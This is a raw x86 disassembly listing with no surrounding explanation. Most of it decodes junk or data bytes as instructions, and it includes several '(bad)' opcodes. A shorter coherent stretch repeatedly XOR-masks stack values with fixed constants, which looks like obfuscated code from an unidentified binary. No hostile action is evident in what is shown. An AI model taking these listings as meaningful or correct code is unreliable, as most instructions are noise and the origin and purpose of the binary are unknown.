  41ec02:	add    BYTE PTR [eax],al
  41ec04:	mov    eax,DWORD PTR [ebp-0x154]
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	hlt    
  41ec1c:	add    al,0xe1
  41ec1e:	nop
  41ec1f:	xor    esi,DWORD PTR [edi-0x40]
  41ec22:	mov    esi,0xbebec44a
  41ec27:	inc    eax
  41ec28:	loopne 0x41ec7f
  41ec2a:	les    ebp,FWORD PTR [ebx-0x4b4c5ac4]
  41ec30:	push   eax
  41ec31:	cld    
  41ec32:	aam    0x6f
  41ec34:	mov    bh,0x55
  41ec36:	data16 fdivr QWORD PTR [edi-0x27]
  41ec3a:	mov    bl,0xa0
  41ec3c:	cmp    BYTE PTR [esi-0x249afdf6],al
  41ec42:	jmp    0xe777:0xda097954
  41ec49:	xor    al,0x7f
  41ec4b:	aaa    
  41ec4c:	rcl    DWORD PTR [esi+0x5aff79b1],cl
  41ec52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec53:	ficom  DWORD PTR [edi]
  41ec55:	or     DWORD PTR [edx-0x48100412],edi
  41ec5b:	iret   
  41ec5c:	add    cl,BYTE PTR [edx-0x80]
  41ec5f:	in     al,dx
  41ec60:	add    eax,0xf58b4353
  41ec65:	jle    0x41ec2c
  41ec67:	or     DWORD PTR [eax-0x14],edx
  41ec6a:	das    
  41ec6b:	inc    esp
  41ec6c:	(bad)  
  41ec6d:	jmp    0xa094:0x925c6138
  41ec74:	inc    esp
  41ec75:	inc    edi
  41ec76:	or     eax,0x7be4b57b
  41ec7b:	lods   eax,DWORD PTR ds:[esi]
  41ec7c:	(bad)  
  41ec7d:	rcr    BYTE PTR [edi],cl
  41ec7f:	nop
  41ec80:	arpl   bp,sp
  41ec82:	int    0x9e
  41ec84:	cmp    al,0x8b
  41ec86:	add    al,bl
  41ec88:	scas   eax,DWORD PTR es:[edi]
  41ec89:	retf   
  41ec8a:	or     BYTE PTR [eax-0x7d705787],dl
  41ec90:	dec    ecx
  41ec91:	mov    ebx,0x3880099f
  41ec96:	out    dx,al
  41ec97:	cld    
  41ec98:	test   al,0xf5
  41ec9a:	lock cmp eax,0x5875e770
  41eca0:	test   al,0x5d
  41eca2:	sbb    ebx,DWORD PTR [eax+0x1b]
  41eca5:	pop    es
  41eca6:	fld    DWORD PTR [edi+0x38]
  41eca9:	lea    esp,[eax+0x4fd03ea6]
  41ecaf:	or     ecx,DWORD PTR [ebp+0x61]
  41ecb2:	retf   0xb1ce
  41ecb5:	pop    esi
  41ecb6:	sbb    BYTE PTR [ebp+0x3],0x17
  41ecba:	sbb    eax,0x43901037
  41ecbf:	add    DWORD PTR [edx],edi
  41ecc1:	mov    ch,0xfb
  41ecc3:	sbb    eax,0xe0a14c4c
  41ecc8:	mov    eax,0xb2c9949f
  41eccd:	xchg   edx,eax
  41ecce:	pop    edi
  41eccf:	jbe    0x41ed32
  41ecd1:	sbb    DWORD PTR [ebx-0x50c3d91f],ebp
  41ecd7:	clc    
  41ecd8:	jge    0x41ed29
  41ecda:	jbe    0x41ed15
  41ecdc:	mov    dl,BYTE PTR [eax+0x65]
  41ecdf:	aad    0xdb
  41ece1:	syscall 
  41ece3:	jmp    0x1ce1:0x5047fea9
  41ecea:	or     DWORD PTR [edx-0x44d11c47],ebp
  41ecf0:	and    DWORD PTR [ebx],eax
  41ecf2:	outs   dx,BYTE PTR ds:[esi]
  41ecf3:	call   0xcfef360
  41ecf8:	mov    DWORD PTR [ebp+0x3c],edx
  41ecfb:	adc    BYTE PTR [edi-0x62],bh
  41ecfe:	js     0x41ec9d
  41ed00:	xchg   edx,eax
  41ed01:	cmp    eax,0x63e5893e
  41ed06:	(bad)  
  41ed07:	jne    0x41ed2d
  41ed09:	pop    edi
  41ed0a:	mov    ds:0x816413e8,al
  41ed0f:	jnp    0x41eca4
  41ed11:	pusha  
  41ed12:	aas    
  41ed13:	shl    BYTE PTR ds:[edx-0x5e],0xd1
  41ed18:	pop    ecx
  41ed19:	ficom  DWORD PTR [eax-0x80]
  41ed1c:	rcr    DWORD PTR [ecx-0x46],1
  41ed1f:	js     0x41ed91
  41ed21:	mov    DWORD PTR [eax-0x5],esp
  41ed24:	daa    
  41ed25:	or     ch,dl
  41ed27:	mov    ds:0xc3dc0b0c,al
  41ed2c:	aad    0x3d
  41ed2e:	into   
  41ed2f:	xchg   ebx,eax
  41ed30:	or     BYTE PTR [edi+ebx*4-0x49729810],dl
  41ed37:	test   DWORD PTR [esi-0x155cc8e6],ebx
  41ed3d:	inc    ebp
  41ed3e:	pop    edx
  41ed3f:	cmp    ah,bl
  41ed41:	mov    ss,WORD PTR [esi+0x6c24aa38]
  41ed47:	or     al,0xa5
  41ed49:	jne    0x41ed2b
  41ed4b:	or     DWORD PTR [ebp+0x16],0x5e1504e6
  41ed52:	mov    fs,WORD PTR [edi]
  41ed54:	fcomp  QWORD PTR [eax]
  41ed56:	pop    esi
  41ed57:	add    DWORD PTR [ecx-0x6c],edi
  41ed5a:	pop    edi
  41ed5b:	pop    esi
  41ed5c:	sub    eax,0x883772cc
  41ed61:	popf   
  41ed62:	mov    WORD PTR [edi],?
  41ed64:	xchg   esi,eax
  41ed65:	mov    edi,0x9e80e762
  41ed6a:	or     al,0xbd
  41ed6c:	mov    al,0xb2
  41ed6e:	add    al,0xb2
  41ed70:	adc    al,0xaa
  41ed72:	fmul   DWORD PTR [ecx]
  41ed74:	push   eax
  41ed75:	mov    bl,0x70
  41ed77:	hlt    
  41ed78:	or     al,0x0
  41ed7a:	xor    eax,ebx
  41ed7c:	call   0x43efb520
  41ed81:	adc    DWORD PTR [edi],ebp
  41ed83:	mov    ds:0xb73bbcbf,al
  41ed88:	mov    edx,0x1178c1c3
  41ed8d:	in     al,0xf7
  41ed8f:	sbb    BYTE PTR [esi],0x3f
  41ed92:	in     al,dx
  41ed93:	push   es
  41ed94:	stc    
  41ed95:	fld    QWORD PTR [ecx]
  41ed97:	mov    ch,0xec
  41ed99:	pop    es
  41ed9a:	cmp    al,0x5c
  41ed9c:	sbb    BYTE PTR [edi-0x3228c092],bh
  41eda2:	paddsb mm5,QWORD PTR [ebx+0xcd4dff2]
  41eda9:	cld    
  41edaa:	repnz dec edx
  41edac:	sub    al,0xc0
  41edae:	test   al,0x73
  41edb0:	fld    QWORD PTR [eax-0x55]
  41edb3:	(bad)  
  41edb5:	inc    eax
  41edb6:	out    dx,eax
  41edb7:	sahf   
  41edb8:	jp     0x41ed65
  41edba:	cmp    al,0x97
  41edbc:	hlt    
  41edbd:	sbb    eax,0x4e9f3274
  41edc2:	and    ah,ch
  41edc4:	adc    DWORD PTR [ebp+0x1e34a9d2],ebp
  41edca:	ss sbb eax,0x8124e041
  41edd0:	pop    edx
  41edd1:	xchg   edi,eax
  41edd2:	(bad)  
  41edd3:	sbb    eax,DWORD PTR [edi]
  41edd5:	aad    0xca
  41edd7:	ret    
  41edd8:	and    bl,BYTE PTR [ebp-0x7e82ec1d]
  41edde:	inc    ebp
  41eddf:	imul   DWORD PTR [esi-0x54]
  41ede2:	mov    ch,0x6b
  41ede4:	mov    cs,WORD PTR [edi-0x3728a255]
  41edea:	inc    ebx
  41edeb:	pop    ebp
  41edec:	pop    edx
  41eded:	add    DWORD PTR [edx+0x60],edx
  41edf0:	popa   
  41edf1:	mov    ds:0x381fba8c,eax
  41edf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf7:	ror    DWORD PTR [esi+0x1d],1
  41edfa:	imul   edi,DWORD PTR [eax+0x4],0x78605699
  41ee01:	mov    WORD PTR [ebx],cs
  41ee03:	fcomi  st,st(1)
  41ee05:	dec    edi
  41ee06:	outs   dx,DWORD PTR ds:[esi]
  41ee07:	mov    bl,0x88
  41ee09:	hlt    
  41ee0a:	inc    esi
  41ee0b:	jo     0x41edfb
  41ee0d:	adc    eax,0x14840dcc
  41ee12:	xchg   ecx,eax
  41ee13:	aas    
  41ee14:	pop    edx
  41ee15:	xchg   ebx,eax
  41ee16:	int3   
  41ee17:	sbb    DWORD PTR [edi-0x787cf4c0],eax
  41ee1d:	sti    
  41ee1e:	add    BYTE PTR [esp+ebp*2-0x2e],al
  41ee22:	sub    DWORD PTR [ebx+eax*2+0x7a7ba4c8],0xffffffdb
  41ee2a:	fadd   QWORD PTR [eax-0x42]
  41ee2d:	mov    bh,0xf7
  41ee2f:	inc    ebp
  41ee30:	xor    DWORD PTR [edi-0x32],edx
  41ee33:	inc    edi
  41ee34:	dec    edx
  41ee35:	(bad)  
  41ee36:	repnz push 0xffffffd7
  41ee39:	mov    esp,ebp
  41ee3b:	inc    esp
  41ee3c:	pop    ebp
  41ee3d:	inc    ebp
  41ee3e:	and    BYTE PTR [edi],bl
  41ee40:	test   BYTE PTR [edi+ebx*1+0x59],ch
  41ee44:	loope  0x41ee06
  41ee46:	sub    BYTE PTR [ebp-0x50],bl
  41ee49:	push   ebp
  41ee4a:	in     al,0x9
  41ee4c:	sti    
  41ee4d:	es inc edi
  41ee4f:	lahf   
  41ee50:	(bad)  
  41ee51:	cmp    al,0x6d
  41ee53:	dec    edi
  41ee54:	pop    edx
  41ee55:	cmp    eax,0xe414f0f9
  41ee5a:	lahf   
  41ee5b:	sub    dh,BYTE PTR [esi+esi*1]
  41ee5e:	ins    DWORD PTR es:[edi],dx
  41ee5f:	(bad)  
  41ee61:	push   ebp
  41ee62:	aam    0xb0
  41ee64:	cmp    dh,BYTE PTR [edi]
  41ee66:	dec    eax
  41ee67:	jne    0x41eee0
  41ee69:	mov    bh,0xd5
  41ee6b:	loop   0x41ee95
  41ee6d:	jl     0x41ee44
  41ee6f:	xchg   ebp,eax
  41ee70:	jle    0x41ee78
  41ee72:	or     eax,0xf50b4acc
  41ee77:	outs   dx,BYTE PTR ds:[esi]
  41ee78:	out    dx,al
  41ee79:	mov    cl,0x4c
  41ee7b:	adc    eax,DWORD PTR [ebx+0x78148c44]
  41ee81:	sub    al,0x85
  41ee83:	fsub   QWORD PTR [eax-0x56dc5e60]
  41ee89:	pop    ecx
  41ee8a:	add    DWORD PTR [esi],edi
  41ee8c:	(bad)  
  41ee8d:	mov    DWORD PTR ds:[ebx-0x72],edx
  41ee91:	jne    0x41ef12
  41ee93:	mov    ss,WORD PTR [edi+0x2228c85b]
  41ee99:	jmp    0x41eec2
  41ee9b:	iret   
  41ee9c:	das    
  41ee9d:	add    DWORD PTR [ecx],esp
  41ee9f:	mov    eax,0x88b019d8
  41eea4:	adc    eax,0x72322e3e
  41eea9:	mov    eax,ds:0xdd1935ec
  41eeae:	mov    DWORD PTR [esi-0x7b],0xf9fa5348
  41eeb5:	jbe    0x41eeae
  41eeb7:	dec    esi
  41eeb8:	xor    al,0x2a
  41eeba:	cdq    
  41eebb:	call   0x779ec684
  41eec0:	lea    edi,[ebx-0x5ba322d7]
  41eec6:	gs pop esp
  41eec8:	sar    esi,0x63
  41eecb:	add    ax,0xb69b
  41eecf:	sub    DWORD PTR [ebp+0xa],ebx
  41eed2:	xor    BYTE PTR [edx+0x7cfb5dbe],dl
  41eed8:	outs   dx,BYTE PTR ds:[esi]
  41eed9:	mov    ebp,0x556b1c0f
  41eede:	inc    eax
  41eedf:	fisttp QWORD PTR [eax+edi*4]
  41eee2:	mov    ebx,0xf229a500
  41eee7:	daa    
  41eee8:	xchg   edi,edx
  41eeea:	push   ebp
  41eeeb:	xchg   ebp,eax
  41eeec:	mov    edi,0x973e749f
  41eef1:	push   edi
  41eef2:	stos   BYTE PTR es:[edi],al
  41eef3:	add    al,0x47
  41eef5:	jns    0x41ee97
  41eef7:	pop    eax
  41eef8:	mov    ch,0x3b
  41eefa:	sbb    dh,dh
  41eefc:	mov    al,0xd4
  41eefe:	mul    BYTE PTR [edi+0x4d]
  41ef01:	addr16 dec ebx
  41ef03:	cwde   
  41ef04:	dec    edx
  41ef05:	hlt    
  41ef06:	push   ebp
  41ef07:	(bad)  
  41ef08:	fsubr  QWORD PTR [ecx+0x19149c3d]
  41ef0e:	jle    0x41ef6e
  41ef10:	adc    eax,0xdd629198
  41ef15:	icebp  
  41ef16:	mov    al,0x88
  41ef18:	adc    eax,0x6c6c053
  41ef1d:	cmp    ah,dl
  41ef1f:	dec    ebp
  41ef20:	nop
  41ef21:	mov    ch,0x22
  41ef23:	lods   al,BYTE PTR ds:[esi]
  41ef24:	adc    esp,DWORD PTR [edi]
  41ef26:	fcomp  QWORD PTR [eax+0x3815fd67]
  41ef2c:	push   esi
  41ef2d:	mov    eax,0x88a3eab0
  41ef32:	fiadd  WORD PTR [esi]
  41ef34:	dec    ebx
  41ef35:	add    al,0xd
  41ef37:	add    eax,0x3e4a0a90
  41ef3c:	jle    0x41ef64
  41ef3e:	mov    ds:0xc7a56716,eax
  41ef43:	out    dx,al
  41ef44:	xor    al,0x97
  41ef46:	out    0x60,al
  41ef48:	in     al,0x72
  41ef4a:	push   edx
  41ef4b:	jecxz  0x41ef17
  41ef4d:	sub    DWORD PTR [esi],0x73
  41ef50:	add    esp,esp
  41ef52:	mov    eax,0x79f6fe6d
  41ef57:	inc    edx
  41ef58:	and    bh,ch
  41ef5a:	bnd jo 0x41ef1b
  41ef5d:	inc    eax
  41ef5e:	jno    0x41ef6d
  41ef60:	sti    
  41ef61:	(bad)  
  41ef62:	fisubr DWORD PTR [esi]
  41ef64:	mov    al,0xc3
  41ef66:	cs js  0x41ef30
  41ef69:	mov    esi,0x3e07c8bc
  41ef6e:	jnp    0x41ef3c
  41ef70:	iret   
  41ef71:	sar    cl,0x8f
  41ef74:	cmc    
  41ef75:	and    ebx,ebx
  41ef77:	dec    esp
  41ef78:	int3   
  41ef79:	push   edi
  41ef7a:	inc    ebp
  41ef7b:	test   al,0xbb
  41ef7d:	test   eax,0x45b5910e
  41ef82:	jge    0x41efe6
  41ef84:	lock lock adc dl,cl
  41ef88:	sub    al,0xbf
  41ef8a:	xor    al,0x38
  41ef8c:	mov    ebx,0x8f50fbc6
  41ef91:	xchg   ebp,eax
  41ef92:	mov    ch,0xae
  41ef94:	sub    ebx,ebx
  41ef96:	aas    
  41ef97:	mov    BYTE PTR [eax+0x6e85fb79],0x1
  41ef9e:	push   cs
  41ef9f:	mov    ds:0x9bc415a,al
  41efa4:	or     al,0xe1
  41efa6:	ins    DWORD PTR es:[edi],dx
  41efa7:	pop    ecx
  41efa8:	leave  
  41efa9:	xor    al,BYTE PTR [edx-0x77477467]
  41efaf:	mov    WORD PTR [ebx+0x4c],?
  41efb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb3:	sbb    edi,eax
  41efb5:	in     al,0xd5
  41efb7:	test   al,0xee
  41efb9:	lods   al,BYTE PTR ds:[esi]
  41efba:	push   ss
  41efbb:	xchg   esp,edi
  41efbd:	jg     0x41f03b
  41efbf:	push   esi
  41efc0:	push   esp
  41efc1:	hlt    
  41efc2:	fcom   DWORD PTR [edi-0x4d8fead1]
  41efc8:	mov    DWORD PTR [esi],ebx
  41efca:	fwait
  41efcb:	jnp    0x41efc9
  41efcd:	mov    gs,ecx
  41efcf:	jg     0xc9aff5a0
  41efd5:	test   al,0x40
  41efd7:	aad    0x8d
  41efd9:	pusha  
  41efda:	cld    
  41efdb:	pop    edi
  41efdc:	ja     0x41f02d
  41efde:	inc    eax
  41efdf:	stos   BYTE PTR es:[edi],al
  41efe0:	push   eax
  41efe1:	dec    ecx
  41efe2:	jge    0x41efe8
  41efe4:	pusha  
  41efe5:	loop   0x41efef
  41efe7:	add    al,0x8d
  41efe9:	pop    ebx
  41efea:	adc    eax,0x877bf021
  41efef:	and    DWORD PTR [edx-0x14f6a75],ecx
  41eff5:	(bad)  
  41eff6:	push   DWORD PTR ds:0xcb79b576
  41effc:	xor    edx,0x9c2b8ae8
  41f002:	mov    cl,0x2
  41f004:	call   0x408bb8
  41f009:	mov    esi,eax
  41f00b:	mov    edi,edx
  41f00d:	mov    eax,DWORD PTR [ebp-0x154]
  41f013:	mov    edx,DWORD PTR [ebp-0x150]
  41f019:	xor    eax,0xcb79b576
  41f01e:	xor    edx,0x9c2b8ae8
  41f024:	mov    cl,0x3e
  41f026:	call   0x422394
  41f02b:	or     esi,eax
  41f02d:	or     edi,edx
  41f02f:	mov    eax,DWORD PTR [ebp-0x160]
  41f035:	imul   esi,eax
  41f038:	add    esi,DWORD PTR [ebp-0x170]
  41f03e:	mov    DWORD PTR [ebp-0x16c],esi
  41f044:	mov    eax,DWORD PTR [ebp-0x16c]
  41f04a:	mov    DWORD PTR [ebp-0x178],eax
  41f050:	jmp    0x41f19e
  41f055:	jmp    0x41f105
  41f05a:	mov    eax,DWORD PTR [ebp-0x154]
  41f060:	mov    edx,DWORD PTR [ebp-0x150]
  41f066:	xor    eax,0xcb79b576
  41f06b:	xor    edx,0x9c2b8ae8
  41f071:	mov    cl,0x2
  41f073:	call   0x408bb8
  41f078:	mov    esi,eax
  41f07a:	mov    edi,edx
  41f07c:	mov    eax,DWORD PTR [ebp-0x154]
  41f082:	mov    edx,DWORD PTR [ebp-0x150]
  41f088:	xor    eax,0xcb79b576
  41f08d:	xor    edx,0x9c2b8ae8
  41f093:	mov    cl,0x3e
  41f095:	call   0x422394
  41f09a:	or     esi,eax
  41f09c:	or     edi,edx
  41f09e:	mov    eax,DWORD PTR [ebp-0x15c]
  41f0a4:	mov    edx,DWORD PTR [ebp-0x158]
  41f0aa:	xor    eax,0xcb79b576
  41f0af:	xor    edx,0x9c2b8ae8
  41f0b5:	mov    cl,0x2
  41f0b7:	call   0x408bb8
  41f0bc:	mov    ebx,eax
  41f0be:	mov    eax,edx
  41f0c0:	mov    ecx,DWORD PTR [ebp-0x15c]
  41f0c6:	mov    edx,DWORD PTR [ebp-0x158]
  41f0cc:	xor    ecx,0xcb79b576
  41f0d2:	xor    edx,0x9c2b8ae8
  41f0d8:	mov    DWORD PTR [ebp-0x234],eax
  41f0de:	mov    eax,ecx
  41f0e0:	mov    cl,0x3e
  41f0e2:	call   0x422394
  41f0e7:	or     ebx,eax
  41f0e9:	mov    eax,DWORD PTR [ebp-0x234]
  41f0ef:	or     eax,edx
  41f0f1:	push   eax
  41f0f2:	push   ebx
  41f0f3:	push   edi
  41f0f4:	push   esi
  41f0f5:	call   0x41594e
  41f0fa:	mov    DWORD PTR [ebp-0x178],eax
  41f100:	jmp    0x41f19e
  41f105:	mov    eax,DWORD PTR [ebp-0x15c]
  41f10b:	mov    edx,DWORD PTR [ebp-0x158]
  41f111:	xor    eax,0xcb79b576
  41f116:	xor    edx,0x9c2b8ae8
  41f11c:	mov    cl,0x2
  41f11e:	call   0x408bb8
  41f123:	mov    esi,eax
  41f125:	mov    edi,edx
  41f127:	mov    eax,DWORD PTR [ebp-0x15c]
  41f12d:	mov    edx,DWORD PTR [ebp-0x158]
  41f133:	xor    eax,0xcb79b576
  41f138:	xor    edx,0x9c2b8ae8
  41f13e:	mov    cl,0x3e
  41f140:	call   0x422394
  41f145:	or     esi,eax
  41f147:	or     edi,edx
  41f149:	mov    DWORD PTR [ebp-0x178],esi
  41f14f:	jmp    0x41f19e
  41f154:	mov    eax,DWORD PTR [ebp-0x15c]
  41f15a:	mov    edx,DWORD PTR [ebp-0x158]
  41f160:	xor    eax,0xcb79b576
  41f165:	xor    edx,0x9c2b8ae8
  41f16b:	mov    cl,0x2
  41f16d:	call   0x408bb8
  41f172:	mov    esi,eax
  41f174:	mov    edi,edx
  41f176:	mov    eax,DWORD PTR [ebp-0x15c]
  41f17c:	mov    edx,DWORD PTR [ebp-0x158]
  41f182:	xor    eax,0xcb79b576
  41f187:	xor    edx,0x9c2b8ae8
  41f18d:	mov    cl,0x3e
  41f18f:	call   0x422394
  41f194:	or     esi,eax
  41f196:	or     edi,edx
  41f198:	mov    DWORD PTR [ebp-0x178],esi
  41f19e:	mov    ecx,DWORD PTR [ebp-0xd8]
  41f1a4:	mov    eax,0x459a
  41f1a9:	xor    edx,edx
  41f1ab:	div    ecx
  41f1ad:	jmp    0x41f594
  41f1b2:	push   edx
  41f1b3:	inc    ebx
  41f1b4:	sbb    eax,0xbcab304b
  41f1b9:	pop    esp
  41f1ba:	or     edi,DWORD PTR [edx]
  41f1bc:	cld    
  41f1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1be:	test   DWORD PTR [edi],eax
  41f1c0:	xor    al,0xdd
  41f1c2:	sar    BYTE PTR [edi-0x40],0xbe
  41f1c6:	dec    edx
  41f1c7:	les    edi,FWORD PTR [esi-0x6d2dca42]
  41f1cd:	mov    WORD PTR [ebx],fs
  41f1cf:	nop
  41f1d0:	lea    eax,ds:0xce6b800c
  41f1d6:	dec    ecx
  41f1d7:	jnp    0x41f206
  41f1d9:	sbb    BYTE PTR [ecx],ah
  41f1db:	sbb    DWORD PTR [ebx-0x54abd44f],esp
  41f1e1:	pop    esi
  41f1e2:	xchg   edx,eax
  41f1e3:	dec    eax
  41f1e4:	stos   BYTE PTR es:[edi],al
  41f1e5:	stc    
  41f1e6:	ss in  al,dx
  41f1e8:	xor    bh,BYTE PTR [ebp-0x5392d1fa]
  41f1ee:	lds    edx,FWORD PTR [edi]
  41f1f0:	pop    esp
  41f1f1:	and    ebx,ebx
  41f1f3:	retf   
  41f1f4:	lock add ebp,DWORD PTR [edi]
  41f1f7:	sub    ebx,DWORD PTR [ecx]
  41f1f9:	call   0xc077:0x9f41d9be
  41f200:	inc    eax
  41f201:	ins    BYTE PTR es:[edi],dx
  41f202:	mov    es,WORD PTR [ecx+0x5cf47e37]
  41f208:	(bad)  
  41f209:	adc    DWORD PTR ss:0x4ca2d7b6,edi
  41f210:	gs push esp
  41f212:	sti    
  41f213:	jb     0x41f257
  41f215:	ret    
  41f216:	mov    al,0x98
  41f218:	adc    DWORD PTR [ecx+0x3b],edx
  41f21b:	aas    
  41f21c:	repz clc 
  41f21e:	push   eax
  41f21f:	push   ecx
  41f220:	xchg   edx,eax
  41f221:	out    0x68,eax
  41f223:	pop    eax
  41f224:	leave  
  41f225:	test   BYTE PTR [eax+ebp*1],al
  41f228:	and    eax,0xb7a320e3
  41f22d:	xor    ebx,DWORD PTR [eax+0x55]
  41f230:	adc    al,BYTE PTR [ebx+0x4beec6ef]
  41f236:	shr    BYTE PTR [esi],0xf3
  41f239:	xor    eax,0xac7059e7
  41f23e:	mov    ebx,0x3159e682
  41f243:	inc    esi
  41f244:	ficomp WORD PTR [eax-0x1ff23725]
  41f24a:	nop
  41f24b:	sbb    dl,BYTE PTR ds:0xb5652283
  41f251:	dec    ebx
  41f252:	sub    DWORD PTR [edx+0x46c7887f],eax
  41f258:	js     0x41f26e
  41f25a:	js     0x41f232
  41f25c:	push   esi
  41f25d:	adc    al,0x4c
  41f25f:	int3   
  41f260:	mov    ebx,0xcd0bb18c
  41f265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f266:	dec    eax
  41f267:	pushf  
  41f268:	fst    st(7)
  41f26a:	add    DWORD PTR [eax],edx
  41f26c:	mov    ebp,0x53eb62aa
  41f271:	sti    
  41f272:	lods   al,BYTE PTR ds:[esi]
  41f273:	sbb    bl,BYTE PTR [esi-0x97c6f1e]
  41f279:	retf   
  41f27a:	retf   0xf2c1
  41f27d:	cli    
  41f27e:	pop    ds
  41f27f:	popf   
  41f280:	aam    0x8d
  41f282:	repnz iret 
  41f284:	lea    esi,[edx]
  41f286:	ja     0x41f255
  41f288:	into   
  41f289:	mov    DWORD PTR [edi-0x39770e0e],ebx
  41f28f:	mov    ch,0x37
  41f291:	fnstsw WORD PTR [ebp+esi*4+0x2a16278b]
  41f298:	in     eax,dx
  41f299:	cmp    DWORD PTR [ecx+0x752a4f5d],ebp
  41f29f:	ret    
  41f2a0:	ja     0x41f288
  41f2a2:	out    0x3f,al
  41f2a4:	push   esp
  41f2a5:	sahf   
  41f2a6:	inc    edx
  41f2a7:	shl    DWORD PTR [ecx],0x2f
  41f2aa:	mov    ds:0xd035ce5f,al
  41f2af:	cmp    dh,BYTE PTR [ebp+0x5eb7e08f]
  41f2b5:	ficom  DWORD PTR cs:[esi+ecx*2+0x5a]
  41f2ba:	sbb    al,0xdd
  41f2bc:	retf   0x80cc
  41f2bf:	push   ss
  41f2c0:	repz add esi,ebp
  41f2c3:	lock fs mov bh,0x22
  41f2c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2c8:	inc    ecx
  41f2c9:	cmp    eax,0xec3545b9
  41f2ce:	sub    al,0xf5
  41f2d0:	xor    al,0x18
  41f2d2:	sbb    eax,0xb9397a8d
  41f2d7:	stos   DWORD PTR es:[edi],eax
  41f2d8:	out    0x6f,eax
  41f2da:	and    BYTE PTR [ebx+ecx*2-0x4f2f4fea],cl
  41f2e1:	mov    ds:0x1ceae1d1,eax
  41f2e6:	push   edi
  41f2e7:	xlat   BYTE PTR ds:[ebx]
  41f2e8:	shr    DWORD PTR [ecx+0x7e40fb96],cl
  41f2ee:	dec    esi
  41f2ef:	push   ebx
  41f2f0:	out    dx,al
  41f2f1:	repz jle 0x41f337
  41f2f4:	push   esp
  41f2f5:	jmp    0x65cc7489
  41f2fa:	std    
  41f2fb:	push   eax
  41f2fc:	inc    eax
  41f2fd:	xlat   BYTE PTR ds:[ebx]
  41f2fe:	test   eax,edx
  41f300:	fstp   QWORD PTR [ebp+0x7a3a690b]
  41f306:	mov    edi,0xb81e0a9a
  41f30b:	and    BYTE PTR [edx+0x52faa4ac],dl
  41f311:	pop    eax
  41f312:	in     eax,dx
  41f313:	add    edi,DWORD PTR [esi-0x1d58130b]
  41f319:	retf   
  41f31a:	jae    0x41f336
  41f31c:	stc    
  41f31d:	jecxz  0x41f2c2
  41f31f:	rcl    cl,1
  41f321:	sub    al,0x71
  41f323:	jmp    0x7ebb:0x4a27ab47
  41f32a:	jge    0x41f2d0
  41f32c:	lahf   
  41f32d:	jne    0x41f2e2
  41f32f:	scas   al,BYTE PTR es:[edi]
  41f330:	sar    BYTE PTR [ecx+0x42],0x68
  41f334:	add    BYTE PTR [ebp-0x12],ch
  41f337:	or     eax,0x73fbab8a
  41f33c:	outs   dx,BYTE PTR ds:[esi]
  41f33d:	outs   dx,BYTE PTR gs:[esi]
  41f33f:	inc    edx
  41f340:	sbb    eax,0xf0874eb1
  41f345:	lods   eax,DWORD PTR ds:[esi]
  41f346:	aam    0xc6
  41f348:	push   eax
  41f349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f34a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f34b:	(bad)  
  41f34c:	icebp  
  41f34d:	loope  0x41f365
  41f34f:	xor    BYTE PTR [edi+edx*4+0x79],0x51
  41f354:	sub    DWORD PTR ss:[esp+esi*2],ecx
  41f358:	push   es
  41f359:	fs lahf 
  41f35b:	ds mov esi,0x578a81f6
  41f361:	sub    DWORD PTR [edx],ecx
  41f363:	in     eax,0x56
  41f365:	jnp    0x41f30a
  41f367:	ja     0x41f360
  41f369:	popa   
  41f36a:	or     esp,DWORD PTR [esi+0x529f47a1]
  41f370:	add    al,0x63
  41f372:	xchg   DWORD PTR [eax-0x320a1b17],edi
  41f378:	pavgw  mm3,QWORD PTR [ebx+edx*4]
  41f37c:	xor    BYTE PTR [bp+si-0x75],ah
  41f380:	push   esp
  41f381:	cmp    esp,edi
  41f383:	add    DWORD PTR ds:0x6825a8c1,esi
  41f389:	cwde   
  41f38a:	ss jae 0x41f363
  41f38d:	lea    edx,[ebp+0x55]
  41f390:	retf   
  41f391:	mov    ah,ch
  41f393:	loope  0x41f3e6
  41f395:	stc    
  41f396:	fwait
  41f397:	sbb    eax,0x828fb77
  41f39c:	or     BYTE PTR [eax-0x21],dh
  41f39f:	in     eax,dx
  41f3a0:	lea    eax,[ebx+ebp*4+0xb7d69ae]
  41f3a7:	jg     0x41f3ce
  41f3a9:	(bad)  
  41f3aa:	sub    esi,DWORD PTR [edx+0x23b649c8]
  41f3b0:	mov    dl,BYTE PTR [edi+0x7122f63d]
  41f3b6:	sub    eax,0xa1ab1380
  41f3bb:	sub    ah,al
  41f3bd:	xchg   ecx,esi
  41f3bf:	and    al,0xa8
  41f3c1:	pop    eax
  41f3c2:	test   DWORD PTR [edx],esi
  41f3c4:	popf   
  41f3c5:	xchg   esp,eax
  41f3c6:	jmp    0xa59c:0x5f3457b5
  41f3cd:	sub    DWORD PTR [esi-0x1d],0x39
  41f3d1:	les    ebp,FWORD PTR [edi-0x7c]
  41f3d4:	push   ds
  41f3d5:	sub    bl,dh
  41f3d7:	aad    0x4b
  41f3d9:	call   0x3c86034b
  41f3de:	nop
  41f3df:	cld    
  41f3e0:	das    
  41f3e1:	jle    0x41f3f2
  41f3e3:	in     al,dx
  41f3e4:	shr    BYTE PTR [esi+esi*4],cl
  41f3e7:	push   esp
  41f3e8:	in     eax,0xc6
  41f3ea:	dec    edi
  41f3eb:	sbb    eax,0xfac26f2f
  41f3f0:	fs pushf 
  41f3f2:	lods   al,BYTE PTR ds:[esi]
  41f3f3:	inc    ebx
  41f3f4:	inc    BYTE PTR [ecx+ecx*2+0x4a]
  41f3f8:	sti    
  41f3f9:	jb     0x41f401
  41f3fb:	and    dh,BYTE PTR [ebx]
  41f3fd:	cmp    cl,al
  41f3ff:	es hlt 
  41f401:	xchg   ebp,eax
  41f402:	xchg   edx,eax
  41f403:	(bad)  
  41f404:	ins    BYTE PTR es:[edi],dx
  41f405:	(bad)  
  41f406:	mov    ecx,0xf62c2777
  41f40b:	xor    bl,al
  41f40d:	push   esp
  41f40e:	pop    es
  41f40f:	cdq    
  41f410:	or     al,0xe8
